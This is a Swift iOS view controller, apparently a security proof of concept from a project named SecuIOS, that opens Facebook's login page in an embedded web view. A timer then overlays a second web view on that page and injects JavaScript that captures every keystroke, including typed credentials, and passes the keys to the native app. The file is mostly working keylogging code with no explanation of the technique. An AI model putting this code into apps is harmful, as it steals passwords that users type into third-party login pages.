//
//  FaceBookViewController.swift
//  SecuIOS
//
//  Created by Henri Gil on 31/01/2018.
//  Copyright © 2018 Henri Gil. All rights reserved.
//

import UIKit
import JSQWebViewController
import WebKit



class FaceBookViewController: UIViewController, WKScriptMessageHandler, WKUIDelegate, WKNavigationDelegate {

//    let label: UILabel = {
//        let l = UILabel(frame: CGRect(x: 0, y: 0, width: 300, height: 50))
//        l.backgroundColor = .white
//        l.textColor = .black
//
//        return l
//    }()
    
    let facebookBut: UIButton = {
        let but = UIButton()
        but.backgroundColor = UIColor.blue
        but.translatesAutoresizingMaskIntoConstraints = false
        but.setTitle("Facebook Login", for: .normal)
        but.titleLabel?.font = UIFont.boldSystemFont(ofSize: 15)
        but.contentMode = .scaleAspectFit
        but.layer.cornerRadius = 3
        but.layer.masksToBounds = true
        return but
    }()
    
    var timer: Timer?
    
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        if(message.name == "callbackHandler") {
            print("Received: \(message.body)")
            //label.text = String(format: "%@ %@", message.body as? String ?? "" , label.text ?? "" )
        }
    }
    
    
     @objc func checkIt(){
        
        if let topController = UIApplication.topViewController() {

            let webViews = topController.view.subviews.filter{$0 is WKWebView}
            
            if let wk =  webViews.first as? WKWebView {
                
                let js: String = "window.addEventListener('keydown', dealWithKeyboard, false); function dealWithKeyboard(e) { console.log(e.key); window.webkit.messageHandlers.callbackHandler.postMessage(e.key);}"
                
                let contentController = WKUserContentController();
                let userScript = WKUserScript(
                    source: js,
                    injectionTime: WKUserScriptInjectionTime.atDocumentEnd,
                    forMainFrameOnly: false
                )
                
                contentController.addUserScript(userScript)
                contentController.add(
                    self,
                    name: "callbackHandler"
                )
                
                let config = WKWebViewConfiguration()
                config.userContentController = contentController
               
                let webView = WKWebView(frame: wk.frame, configuration: config)
                webView.uiDelegate = self
                webView.navigationDelegate = self
                webView.backgroundColor = .white
                
                (webViews.first!).addSubview(webView)
                
                let req = URLRequest(url: wk.url!)
                webView.load(req)

//                webView.addSubview(label)
//                label.frame = CGRect(x: 0, y: webView.frame.height-50, width: webView.frame.width, height: 50)
                
                timer?.invalidate()
            }
        }
    }
    
    
   
    
    override func viewDidLoad() {
        super.viewDidLoad()

        timer = Timer.scheduledTimer(timeInterval: 1, target: self, selector: #selector(checkIt), userInfo: nil, repeats: true)
        
        view.backgroundColor = .red
        facebookBut.addTarget(self, action: #selector(facebookHandle), for: .touchUpInside)

        view.addSubview(facebookBut)
        
        facebookBut.centerXAnchor.constraint(equalTo: view.centerXAnchor).isActive=true
        facebookBut.centerYAnchor.constraint(equalTo: view.centerYAnchor).isActive=true
        facebookBut.widthAnchor.constraint(equalToConstant: 300).isActive=true
        facebookBut.heightAnchor.constraint(equalToConstant: 50).isActive=true
    }

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
        // Dispose of any resources that can be recreated.
    }
    
    
    @objc func facebookHandle(){
        print("facebookHandle")
        let controller = WebViewController(url: URL(string: "https://www.facebook.com/login/")!)
        let nav = UINavigationController(rootViewController: controller)
        present(nav, animated: true, completion: nil)
    }
    
    

 
}



extension UIApplication {
    class func topViewController(controller: UIViewController? = UIApplication.shared.keyWindow?.rootViewController) -> UIViewController? {
        if let navigationController = controller as? UINavigationController {
            return topViewController(controller: navigationController.visibleViewController)
        }
        if let tabController = controller as? UITabBarController {
            if let selected = tabController.selectedViewController {
                return topViewController(controller: selected)
            }
        }
        if let presented = controller?.presentedViewController {
            return topViewController(controller: presented)
        }
        return controller
    }
}
